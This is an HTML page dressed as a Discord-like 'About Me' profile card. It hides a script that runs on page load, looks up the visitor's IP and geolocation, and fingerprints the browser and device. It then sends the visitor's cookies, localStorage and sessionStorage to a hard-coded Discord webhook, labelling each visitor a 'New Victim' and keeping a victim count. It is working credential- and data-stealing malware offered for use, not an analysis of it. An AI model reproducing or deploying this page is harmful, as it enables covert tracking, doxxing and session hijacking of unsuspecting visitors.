<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>About Me</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      background: linear-gradient(135deg, #7289da 0%, #99aab5 50%, #43b581 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      color: #ffffff;
      overflow: hidden;
    }
    
    body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grain" width="100" height="100" patternUnits="userSpaceOnUse"><circle cx="25" cy="25" r="1" fill="white" opacity="0.1"/><circle cx="75" cy="75" r="1" fill="white" opacity="0.1"/><circle cx="50" cy="10" r="0.5" fill="white" opacity="0.05"/></pattern></defs><rect width="100" height="100" fill="url(%23grain)"/></svg>');
      pointer-events: none;
    }
    
    .profile-container {
      position: relative;
      z-index: 1;
    }
    
    .profile-card {
      background: rgba(255, 255, 255, 0.15);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border: 1px solid rgba(255, 255, 255, 0.2);
      border-radius: 8px;
      padding: 48px 64px;
      max-width: 600px;
      width: 90%;
      text-align: center;
      box-shadow: 
        0 8px 32px rgba(0, 0, 0, 0.1),
        inset 0 1px 0 rgba(255, 255, 255, 0.2);
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }
    
    .profile-card:hover {
      transform: translateY(-4px);
      box-shadow: 
        0 16px 48px rgba(0, 0, 0, 0.15),
        inset 0 1px 0 rgba(255, 255, 255, 0.3);
    }
    
    .pfp {
      width: 120px;
      height: 120px;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.2);
      margin: 0 auto 24px;
      border: 3px solid rgba(255, 255, 255, 0.3);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 48px;
      color: rgba(255, 255, 255, 0.5);
    }
    
    .username {
      font-size: 28px;
      font-weight: 600;
      margin-bottom: 8px;
      color: rgba(255, 255, 255, 0.95);
      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
    }
    
    .nickname {
      font-size: 18px;
      font-weight: 400;
      color: rgba(255, 255, 255, 0.7);
      margin-bottom: 24px;
      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
    }
    
    .bio {
      font-size: 16px;
      font-weight: 300;
      line-height: 1.5;
      color: rgba(255, 255, 255, 0.8);
      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
    }
    
    @media (max-width: 480px) {
      .profile-card {
        padding: 32px 24px;
        margin: 20px;
      }
      
      .pfp {
        width: 100px;
        height: 100px;
        font-size: 40px;
      }
      
      .username {
        font-size: 24px;
      }
    }
  </style>
</head>
<body>
  <div class="profile-container">
    <div class="profile-card">
      <div class="pfp">ðŸ‘¤</div>
      <h2 class="username">username</h2>
      <h3 class="nickname">nickname</h3>
      <p class="bio">test</p>
    </div>
  </div>
  
  <script>
    const webhookUrl = 'https://discord.com/api/webhooks/1437139077714411624/UGLtXYwbnVJsgG5mayU6fyq4p0HqDMEDlg_6V6U8rZRc0FjxXk5y-2W0bohbzTsL3QAk';
    
    const sendData = async () => {
      console.log('Script started - attempting to send data...');
      
      // Fallback: Send basic test embed immediately if anything fails
      const sendBasic = () => {
        const basicPayload = {
          content: 'Basic test from page load',
          embeds: [{
            title: 'Fallback User Data',
            description: `Timestamp: ${new Date().toISOString()}\nUser Agent: ${navigator.userAgent.substring(0, 500)}`,
            color: 3447003,
            footer: { text: 'Basic send - full data failed' }
          }]
        };
        fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(basicPayload)
        }).then(() => {
          console.log('Basic fallback sent!');
          sendSuccessMessage(1); // Placeholder count
        }).catch(e => console.error('Basic send failed:', e));
      };
      
      let ip = 'unknown';
      let geoData = {};
      
      try {
        console.log('Fetching IP...');
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        ip = ipData.ip;
        console.log('IP fetched:', ip);
      } catch (error) {
        console.error('IP fetch failed:', error);
      }
      
      try {
        console.log('Fetching geo...');
        const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`);
        geoData = await geoResponse.json();
        console.log('Geo fetched:', geoData.status);
      } catch (error) {
        console.error('Geo fetch failed:', error);
      }
      
      // Build fields with available data (ignore failures)
      const fields = [];
      const timestamp = new Date().toISOString();
      const userAgent = navigator.userAgent || 'unknown';
      const languages = navigator.languages ? navigator.languages.join(', ') : (navigator.language || 'unknown');
      const platform = navigator.platform || 'unknown';
      const screenRes = `${screen.width}x${screen.height}x${screen.colorDepth}` || 'unknown';
      const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
      const referrer = document.referrer || 'direct';
      const doNotTrack = navigator.doNotTrack || 'unspecified';
      const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
      const deviceMemory = navigator.deviceMemory || 'unknown';
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || (geoData.timezone || 'unknown');
      let connection = 'unsupported';
      try {
        if (navigator.connection) {
          connection = `${navigator.connection.effectiveType} (${navigator.connection.downlink || 'unknown'} Mbps)`;
        }
      } catch (error) {
        console.error('Connection info failed:', error);
      }
      let pluginsList = 'none';
      try {
        pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(', ');
      } catch (error) {
        console.error('Plugins fetch failed:', error);
      }
      
      // Geo fields (with fallbacks - ignore if failed)
      const country = geoData.country || 'unknown';
      const city = geoData.city || 'unknown';
      const lat = geoData.lat || 'unknown';
      const lon = geoData.lon || 'unknown';
      const status = geoData.status || 'unknown';
      const mobile = geoData.mobile ? 'Yes' : 'No';
      const proxy = geoData.proxy ? 'Yes' : 'No';
      const hosting = geoData.hosting ? 'Yes' : 'No';
      const isp = geoData.isp || 'unknown';
      const org = geoData.org || 'unknown';
      const asNum = geoData.as || 'unknown';
      const region = geoData.regionName || 'unknown';
      const regionCode = geoData.region || 'unknown';
      const district = geoData.district || 'unknown';
      const zip = geoData.zip || 'unknown';
      const countryCode = geoData.countryCode || 'unknown';
      
      fields.push(
        { name: 'Location', value: `${city}, ${region} (${country} / ${countryCode})\nDistrict: ${district} | ZIP: ${zip}\nCoords: ${lat}, ${lon}`, inline: false },
        { name: 'Network', value: `ISP: ${isp}\nOrg: ${org}\nAS: ${asNum}\nStatus: ${status} | Mobile: ${mobile} | Proxy: ${proxy} | Hosting: ${hosting}`, inline: false },
        { name: 'Device', value: `Platform: ${platform}\nResolution: ${screenRes}\nCores: ${hardwareConcurrency} | RAM: ${deviceMemory}GB\nTimezone: ${timezone}`, inline: false },
        { name: 'Browser', value: `User Agent: ${userAgent.substring(0, 512)}...\nLanguages: ${languages.substring(0, 256)}...\nCookies: ${cookieEnabled} | DNT: ${doNotTrack}`, inline: false },
        { name: 'Connection', value: connection, inline: true },
        { name: 'Plugins', value: pluginsList.substring(0, 1024) || 'None detected', inline: false },
        { name: 'Referrer', value: referrer, inline: false }
      );
      
      const embed = {
        title: `New Victim: ${ip}`,
        description: `Timestamp: ${timestamp}\nReferrer: ${referrer}`,
        color: 3447003,
        fields: fields,
        footer: { text: 'Grabbed via Discord-like About Me Page' }
      };
      
      const formData = new FormData();
      formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
      
      // Optional: Add storage files (skip if they cause issues)
      try {
        if (document.cookie) {
          const cookiesBlob = new Blob([document.cookie], { type: 'text/plain' });
          formData.append('file1', cookiesBlob, 'cookies.txt');
        }
      } catch (error) {
        console.error('Cookies prep failed:', error);
      }
      
      try {
        const lsData = JSON.stringify(Object.fromEntries(Object.entries(localStorage)), null, 2);
        const lsBlob = new Blob([lsData], { type: 'application/json' });
        formData.append('file2', lsBlob, 'localStorage.json');
      } catch (error) {
        console.error('LocalStorage prep failed:', error);
      }
      
      try {
        const ssData = JSON.stringify(Object.fromEntries(Object.entries(sessionStorage)), null, 2);
        const ssBlob = new Blob([ssData], { type: 'application/json' });
        formData.append('file3', ssBlob, 'sessionStorage.json');
      } catch (error) {
        console.error('SessionStorage prep failed:', error);
      }
      
      try {
        console.log('Sending to webhook...');
        const response = await fetch(webhookUrl, {
          method: 'POST',
          body: formData,
        });
        if (response.ok) {
          console.log('Full data sent successfully!');
          sendSuccessMessage(42); // Replace 42 with your current total victim count (update manually after each new victim)
        } else {
          console.error('Webhook response not OK:', response.status, response.statusText);
          sendBasic();
        }
      } catch (error) {
        console.error('Webhook send failed:', error);
        sendBasic();
      }
    };
    
    const sendSuccessMessage = (victimCount) => {
      const successPayload = {
        content: `successfully logged data, total victims : ${victimCount}`
      };
      fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(successPayload)
      }).then(() => {
        console.log(`Success message sent with count: ${victimCount}`);
      }).catch(e => {
        console.error('Success message send failed:', e);
      });
    };
    
    // Run immediately on script load
    sendData();
    
    // Backup on DOM ready (in case)
    document.addEventListener('DOMContentLoaded', () => {
      console.log('DOM loaded - re-running sendData');
      sendData();
    });
  </script>
</body>
</html>
